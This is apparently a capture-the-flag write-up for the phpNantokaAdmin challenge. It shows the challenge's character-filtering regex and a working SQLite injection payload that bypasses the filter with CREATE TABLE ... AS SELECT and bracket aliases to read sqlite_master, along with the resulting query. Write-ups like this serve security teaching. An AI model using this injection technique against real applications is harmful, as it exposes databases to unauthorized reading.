### phpNantokaAdmin

Very interesting challenge:

- SQLite injection like this:

```
CREATE TABLE {injection} (dummy1 TEXT, dummy2 TEXT, `{injection_2}` {injection_3}, ...)
```

- Each of those injections are limited to 32 chars and have to pass the following regex:

```php
function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}
```


- Solution is to use `CREATE TABLE ... SELECT` statement which populates the new table with the content from the select statement.

- Use the `[]` keywords to wrap the irrelevant stuff into an alias and create a valid query:

```
table_name=neko as select 1 as [&columns[0][name]=] UniOn Select sql as &columns[0][type]=lol&columns[1][name]= from sqlite_master;&columns[1][type]=XXXXXX
```

- The query becomes

```
CREATE TABLE neko as select 1 as [ (dummy1 TEXT, dummy2 TEXT, `] UniOn Select sql as ` lol, ` from sqlite_master;` XXXXXX);
```

